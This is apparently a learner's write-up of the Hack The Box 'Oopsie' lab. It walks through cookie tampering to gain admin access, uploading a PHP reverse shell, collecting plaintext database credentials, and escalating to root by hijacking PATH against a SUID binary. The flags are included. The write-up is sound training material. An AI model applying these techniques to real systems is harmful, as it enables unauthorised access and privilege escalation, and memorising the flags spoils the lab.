# OOPSIE

**Platform**: Hack The Box\
**Difficulty**: Very Easy\
**Date**: 2026-06-14 0845\
**OS**: Linux\
**IP**: 10.129.95.191
export IP=10.129.95.191
export IP=10.129.86.152

# Machine Tasks

Task 1
 > With what kind of tool can intercept web traffic?
`proxy`

* This is a good indicator that we will likely use burpsuite to complete this lab.

Task 2
 > What is the path to the directory on the webserver that returns a login page?
`/cdn-cgi/login/`
 
 * website homepage:
   * Visitors are asked to `login to get access to the service`
   * Potential users: `admin@megacorp.com`
 * no resource found when manually navigating to `$IP/login` or `$IP/home` 
 * gobuster did not return any login pages, but did return `/uploads` dir which gives us a 403 error when visiting
 
[loginpage_burp.png]
[loginpage.png]

Task 3
 > What can be modified in Firefox to get access to the upload page?
 `cookie`

Initial notes:
* no error returned when attemppting to spray login page with default creds (e.g, admin:admin)
* 'Login as Guest' available
* cookies can be modified to access different users sessions, but we need to be authenticated to receieve a cookie.
* we received cookie: `user=2233; role=guest`

Task 4
 > What is the access ID of the admin user?
 `34322`
 
 * turn intercept on in burpsuite and modify cookie using the same format:
 user=1; role=admin (signed out of guest account)
 user=2; role=admin (same)
 * after attempting, referred to writeup, where it showed the `accounts` page. stop assuming next steps, explore attack surface and use context clues to determine where these things are.

* URL vulnerable to Information Disclosure: `http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2`
 * changing `id` parameter, we are able to view ID of admin user.

[admin_cookie.png]

* user=<Access ID>; role=<Name>
* modifying cookie in burpsuite allows us to access uploads page: 
`user=34322; role=admin`

[uploads_page.png]

Task 5
 > On uploading a file, what directory does that file appear in on the server?
 `/uploads`
 
 * copied php reverse shell and modified in vim
 * uploaded to site, started netcat listener, and accessed shell via browser, then stabilized shell
 * once shell is stable, we can further enumerate:
   * `whoami`: www-data
   * `user.txt` file located in `/home/robert/` directory
   * site uses PHP and SQL (passwords in plaintext)
   * `var/www/html/cdn-cgi/login` directory to grep for potential passwords:

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i passw*
cat * | grep -i passw*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
```
Task 6
 > What is the file that contains the password that is shared with the robert user?
`db.php`

* the last discovered password gave us an auth failure error, we then search for another password:

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i robert
cat * | grep -i robert
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');

robert:M3g4C0rpUs3r!
```

`ssh robert@$IP`

Task 7
 > What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
 `find`

* `id` command identified a group robert belongs to called `bugtracker`

[group_privesc.png]

* a file named `bugtracker` was identified, we can check the privileges and file type

`ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker`

[groupfiles_privesc.png]

Task 8
 > Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
 `root`

* a SUID is set on the binary (potential exploit path)
 > Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here.

* the binary 'bugtracker' is owned by root & can be executed as root since the SUID is set


Task 9
 > What SUID stands for?
 `Set Owner User ID`

Task 10
 > What is the name of the executable being called in an insecure manner?
 `cat`
 
 * the 'bugtracker' tool attempts to output a file using the `cat` command and an error is displayed when it doesn't find that file. 
 * the error appears to show `cat` is being referenced without a full path, relying on the `$PATH` variable of the user's session to find the executable
 * navigate to the `/tmp` directory, create file named `cat` with the following:
` /bin/sh`

* Set the execute privs:
`chmod +x cat`

* To exploit, we add the /tmp dir to the PATH environment variable.
> PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and
Microsoft Windows, specifying a set of directories where executable programs are
located.

`export PATH=/tmp:$PATH`
`echo $PATH`

* execute `bugtracker` from the `/tmp` dir
* root flag is found in the `/root` folder

---

# Flags

#### User
```text
f2c74ee8db7983851ab2a96a44eb7981
```

#### Root/Admin
```text
af13b0bee69f8a877c3faf667f7beacf
```

---

# Lessons Learned

**Key takeaway**:\
**Enumeration lesson**:\
**Missed clues**:\
**New/Useful Commands**:
